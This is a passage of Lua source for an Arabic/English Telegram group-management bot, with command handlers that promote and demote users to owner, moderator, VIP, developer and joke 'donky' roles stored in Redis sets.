                texts = '*🎈|| المعرف غير صحيح ❎*'
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
          end
          resolve_username(ap[2],setownerall_by_username)
        end
        --------------------------------------faeder---------------------------------------------------------
        if text:match("^[Ss]etownerall (%d+)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
          local ap = {string.match(text, "^([Ss]etownerall) (%d+)$")}
          database:sadd('bot:onall:', ap[2])
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been onwer all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم رفعه مدير عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          end
        end
        ----------------------------------------faeder-------------------------------------------------------
        local text = msg.content_.text_:gsub('تنزيل مدير عام','Demownerall')
        if text:match("^[Dd]emownerall$") and is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
          function deownerall_by_reply(extra, result, success)
            local hash = 'bot:onall:'
            if not database:sismember(hash, result.sender_user_id_) then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a owner all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم رفعه مدير عام سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            else
              database:srem(hash, result.sender_user_id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The Owner ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| removed from owner all list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المدير العام ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          getMessage(msg.chat_id_, msg.reply_to_message_id_,deownerall_by_reply)
        end
        ----------------------------------------faeder-------------------------------------------------------
        if text:match("^[Dd]emownerall @(.*)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
          local hash = 'bot:onall:'
          local ap = {string.match(text, "^([Dd]emownerall) @(.*)$")}
          function remownerall_by_username(extra, result, success)
            if result.id_ then
              database:srem(hash, result.id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| The Owner all ؛ '..result.id_..' ، 🚷\n🎈|| removed from owner all list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              else
                texts = '*🎈|| المدير العام ؛ '..result.id_..' ، 🚷\n🎈|| تم تنزيله عضو في البوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| Username is not correct ❎*'
              else
                texts = '*🎈|| المعرف غير صحيح ❎*'
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
          end
          resolve_username(ap[2],remownerall_by_username)
        end
        ----------------------------------------------faeder-------------------------------------------------
        if text:match("^[Dd]emownerall (%d+)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
          local hash = 'bot:onall:'
          local ap = {string.match(text, "^([Dd]emownerall) (%d+)$")}
          database:srem(hash, ap[2])
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The Owner all ؛ '..ap[2]..' ، 🚷\n🎈|| removed from owner all list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المدير العام ؛ '..ap[2]..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          end
        end
        ------------------------------------------faeder-----------------------------------------------------
        local text = msg.content_.text_:gsub('رفع ادمن عام','Promoteall')
        if text:match("^[Pp]romoteall$") and is_onall(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0  then
          function promoteall_by_reply(extra, result, success)
            local hash = 'bot:moall:'
            if database:sismember(hash, result.sender_user_id_) then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now a moderator all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🚦|| تم رفعه ادمن عام سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been promote all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه ادمن عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
              end
              database:sadd(hash, result.sender_user_id_)
            end
          end
          getMessage(msg.chat_id_, msg.reply_to_message_id_,promoteall_by_reply)
        end
        -----------------------------------------faeder------------------------------------------------------
        if text:match("^[Pp]romoteall @(.*)$") and is_onall(msg.sender_user_id_, msg.chat_id_) then
          local ap = {string.match(text, "^([Pp]romote) @(.*)$")}
          function promoteall_by_username(extra, result, success)
            if result.id_ then
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| promoted to moderator all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              else
                texts = '🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم رفعه ادمن عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
              end
              database:sadd('bot:moall:', result.id_)
            else
              if not database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| Username is not correct ❎*'
              else
                texts = '*🎈|| المعرف غير صحيح ❎*'
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
          end
          resolve_username(ap[2],promoteall_by_username)
        end
        -------------------------------------faeder----------------------------------------------------------
        if text:match("^[Pp]romoteall (%d+)$") and is_onall(msg.sender_user_id_, msg.chat_id_) then
          local ap = {string.match(text, "^([Pp]romoteall) (%d+)$")}
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| has been promote all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🚦|| تم رفعه ادمن عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
          end
          database:sadd('bot:moall:', ap[2])
        end
        -----------------------------------------faeder------------------------------------------------------
        local text = msg.content_.text_:gsub('تنزيل ادمن عام','Demoteall')
        if text:match("^[Dd]emoteall$") and is_onall(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
          function demoteall_by_reply(extra, result, success)
            local hash = 'bot:moall:'
            if not database:sismember(hash, result.sender_user_id_) then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not promote all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم رفعه ادمن عام سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            else
              database:srem(hash, result.sender_user_id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| was removed from promoted all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| الادمن العام ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم تنزيله عضو بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          getMessage(msg.chat_id_, msg.reply_to_message_id_,demoteall_by_reply)
        end
        -------------------------------------------faeder----------------------------------------------------
        if text:match("^[Dd]emoteall @(.*)$") and is_onall(msg.sender_user_id_, msg.chat_id_) then
          local hash = 'bot:moall:'
          local ap = {string.match(text, "^([Dd]emoteall) @(.*)$")}
          function demoteall_by_username(extra, result, success)
            if result.id_ then
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| was demoted all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              else
                texts = '🎈|| الادمن العام ؛ '..result.id_..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
              end
              database:srem(hash, result.id_)
            else
              if not database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| Username is not correct ❎*'
              else
                texts = '*🎈|| المعرف غير صحيح ❎*'
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
          end
          resolve_username(ap[2],demoteall_by_username)
        end
        ------------------------------------------faeder-----------------------------------------------------
        if text:match("^[Dd]emoteall (%d+)$") and is_onall(msg.sender_user_id_, msg.chat_id_) then
          local hash = 'bot:moall:'
          local ap = {string.match(text, "^([Dd]emoteall) (%d+)$")}
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| was demoted all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '🎈|| الادمن العام ؛ '..ap[2]..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
          end
          database:srem(hash, ap[2])
        end
        ------------------------------------------faeder-----------------------------------------------------
        if is_moall(msg.sender_user_id_, msg.chat_id_) then
          local text = msg.content_.text_:gsub('رفع مميز عام','Setvipall')
          if text:match("^[Ss]etvipall$") and msg.reply_to_message_id_ ~= 0  then
            function promoteall_by_reply(extra, result, success)
              local hash = 'bot:vpall:'
              if database:sismember(hash, result.sender_user_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now a VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه عضو مميز عام سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been a VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه عضو مميز عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
                database:sadd(hash, result.sender_user_id_)
              end
            end
            getMessage(msg.chat_id_, msg.reply_to_message_id_,promoteall_by_reply)
          end
          ----------------------------------------faeder-------------------------------------------------------
          if text:match("^[Ss]etvipall @(.*)$") then
            local ap = {string.match(text, "^([Ss]etvipall) @(.*)$")}
            function promoteall_by_username(extra, result, success)
              if result.id_ then
                if database:get('lang:gp:'..msg.chat_id_) then
                  texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| promoted to VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                else
                  texts = '🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم رفعه عضو مميز عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
                end
                database:sadd('bot:vpall:', result.id_)
              else
                if not database:get('lang:gp:'..msg.chat_id_) then
                  texts = '*🎈|| Username is not correct ❎*'
                else
                  texts = '*🎈|| المعرف غير صحيح ❎*'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
            end
            resolve_username(ap[2],promoteall_by_username)
          end
          -------------------------------faeder----------------------------------------------------------------
          if text:match("^[Ss]etvipall (%d+)$") then
            local ap = {string.match(text, "^([Ss]etvipall) (%d+)$")}
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| has been a VIP member all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم رفعه عضو مميز عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
            end
            database:sadd('bot:vpall:', ap[2])
          end
          -------------------------------------faeder----------------------------------------------------------
          local text = msg.content_.text_:gsub('تنزيل مميز عام','Demvipall')
          if text:match("^[Dd]emvipall$") and msg.reply_to_message_id_ ~= 0 then
            function demoteall_by_reply(extra, result, success)
              local hash = 'bot:vpall:'
              if not database:sismember(hash, result.sender_user_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم رفعه مميز عام سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
              else
                database:srem(hash, result.sender_user_id_)
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The vip ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| was removed from VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المميز العام ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم تنزيله عضو اعتيادي بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
              end
            end
            getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
          end
          -----------------------------------------faeder------------------------------------------------------
          if text:match("^[Dd]emvipall @(.*)$") then
            local hash = 'bot:vpall:'
            local ap = {string.match(text, "^([Dd]emvipall) @(.*)$")}
            function demoteall_by_username(extra, result, success)
              if result.id_ then
                if database:get('lang:gp:'..msg.chat_id_) then
                  texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| was demoted from VIP member all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                else
                texts = '🎈|| المميز العام ؛ '..result.id_..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
                end
                database:srem(hash, result.id_)
              else
                if not database:get('lang:gp:'..msg.chat_id_) then
                  texts = '*🎈|| Username is not correct ❎*'
                else
                  texts = '*🎈|| المعرف غير صحيح ❎*'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
            end
            resolve_username(ap[2],demoteall_by_username)
          end
          --------------------------------faeder---------------------------------------------------------------
          if text:match("^[Dd]emvipall (%d+)$") then
            local hash = 'bot:vpall:'
            local ap = {string.match(text, "^([Dd]emvipall) (%d+)$")}
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The vip all ؛ '..ap[2]..' ، 🚷\n🎈|| was removed from VIP member all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🎈|| المميز العام ؛ '..ap[2]..' ، 🚷\n🎈|| تم تنزيله عضو اعتيادي بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
            end
            database:srem(hash, ap[2])
          end
        end
                ------------------------------------------faeder-----------------------------------------------------
          
          local text = msg.content_.text_:gsub('رفع مطي','Setdonky')
          if text:match("^[Ss]etdonky$") and msg.reply_to_message_id_ ~= 0  then
            function donky_by_reply(extra, result, success)
              local hash = 'bot:donky:'..msg.chat_id_
              if database:sismember(hash, result.sender_user_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now a donky ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| هو مطي شرفع منه بعد  😹💔\nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been a Full donky  😂💔\nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مطي فول مواصفات 😹💔 \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
                database:sadd(hash, result.sender_user_id_)
              end
            end
            getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
          end
          ----------------------------------------faeder-------------------------------------------------------
          local text = msg.content_.text_:gsub('تنزيل مطي','demdonky')
          if text:match("^[Dd]emdonky$") and msg.reply_to_message_id_ ~= 0 then
            function donky_by_reply(extra, result, success)
              local hash = 'bot:donky:'..msg.chat_id_
              if not database:sismember(hash, result.sender_user_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a donky ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| مع الاسف هذا العضو مو مطي 😹😔 \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
              else
                database:srem(hash, result.sender_user_id_)
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The vip ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| was removed from donky list \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المطي ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| صار بشر جان خوش مطي مع الاسف 😹😔 \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
              end
            end
            getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
          end
        ----------------------------------------------faeder-------------------------------------------------
        local text = msg.content_.text_:gsub('رفع مدير','setowner')
        if text:match("^[Ss]etowner$") and is_sudo(msg) and msg.reply_to_message_id_ ~= 0 then
          function owner_by_reply(extra, result, success)
            local hash = 'bot:owners:'..msg.chat_id_
            if database:sismember(hash, result.sender_user_id_) then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now owner bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مدير سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            else
              database:sadd(hash, result.sender_user_id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been owner bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مدير بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          getMessage(msg.chat_id_, msg.reply_to_message_id_,owner_by_reply)
        end
        --------------------------------------------faedee---------------------------------------------------
        if text:match("^[Ss]etowner @(.*)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) then
          local ap = {string.match(text, "^([Ss]etowner) @(.*)$")}
          function setowner_by_username(extra, result, success)
            if result.id_ then
              database:sadd('bot:owners:'..msg.chat_id_, result.id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| added to owner list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              else
                texts = '*🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم رفعه مدير في البوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| Username is not correct ❎*'
              else
                texts = '*🎈|| المعرف غير صحيح ❎*'
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
          end
          resolve_username(ap[2],setowner_by_username)
        end
        --------------------------------------faeder---------------------------------------------------------
        if text:match("^[Ss]etowner (%d+)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) then
          local ap = {string.match(text, "^([Ss]etowner) (%d+)$")}
          database:sadd('bot:owners:'..msg.chat_id_, ap[2])
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been onwer ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم رفعه مدير البوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          end
        end
        ----------------------------------------faeder-------------------------------------------------------
        local text = msg.content_.text_:gsub('تنزيل مدير','Demowner')
        if text:match("^[Dd]emowner$") and is_monsh(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
          function deowner_by_reply(extra, result, success)
            local hash = 'bot:owners:'..msg.chat_id_
            if not database:sismember(hash, result.sender_user_id_) then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a owner ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم رفعه مدير سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            else
              database:srem(hash, result.sender_user_id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The Owner ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| removed from owner list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المدير ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          getMessage(msg.chat_id_, msg.reply_to_message_id_,deowner_by_reply)
        end
        ----------------------------------------faeder-------------------------------------------------------
        if text:match("^[Dd]emowner @(.*)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) then
          local hash = 'bot:owners:'..msg.chat_id_
          local ap = {string.match(text, "^([Dd]emowner) @(.*)$")}
          function remowner_by_username(extra, result, success)
            if result.id_ then
              database:srem(hash, result.id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| The Owner ؛ '..result.id_..' ، 🚷\n🎈|| removed from owner list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              else
                texts = '*🎈|| المدير ؛ '..result.id_..' ، 🚷\n🎈|| تم تنزيله عضو في البوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| Username is not correct ❎*'
              else
                texts = '*🎈|| المعرف غير صحيح ❎*'
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
          end
          resolve_username(ap[2],remowner_by_username)
        end
        ----------------------------------------------faeder-------------------------------------------------
        if text:match("^[Dd]emowner (%d+)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) then
          local hash = 'bot:owners:'..msg.chat_id_
          local ap = {string.match(text, "^([Dd]emowner) (%d+)$")}
          database:srem(hash, ap[2])
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The Owner ؛ '..ap[2]..' ، 🚷\n🎈|| removed from owner list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المدير ؛ '..ap[2]..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          end
        end
        ----------------------------------------------faeder-------------------------------------------------
        local text = msg.content_.text_:gsub('رفع مطور رتبه ثالثه','setdev3')
        if text:match("^[Ss]etdev3$") and is_sudo(msg) and msg.reply_to_message_id_ ~= 0 then
          function addadmin_by_reply(extra, result, success)
            local hash = 'bot:admins:'
            if database:sismember(hash, result.sender_user_id_) then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مطور فالرتبه الثالثه سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            else
              database:sadd(hash, result.sender_user_id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مطور فالرتبه الثالثه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          getMessage(msg.chat_id_, msg.reply_to_message_id_,addadmin_by_reply)
        end
        -----------------------------------------------------------------------------------------------
        if text:match("^[Ss]etdev3 @(.*)$") and is_sudo(msg) then
          local ap = {string.match(text, "^([Ss]etdev3) @(.*)$")}
          function addadmin_by_username(extra, result, success)
            if result.id_ then
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷|| has been Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              else
                texts = '🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم رفعه مطور رتبه ثالثه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
              end
              database:sadd('bot:admins:', result.id_)
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| Username is not correct ❎*'
              else
                texts = '*🎈|| المعرف غير صحيح ❎*'
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
          end
          resolve_username(ap[2],addadmin_by_username)
        end
        ----------------------------------------faeder-------------------------------------------------------
        if text:match("^[sS]etdev3 (%d+)$") and is_sudo(msg) then
          local ap = {string.match(text, "^([Ss]etdev3) (%d+)$")}
          if database:get('lang:gp:'..msg.chat_id_) then
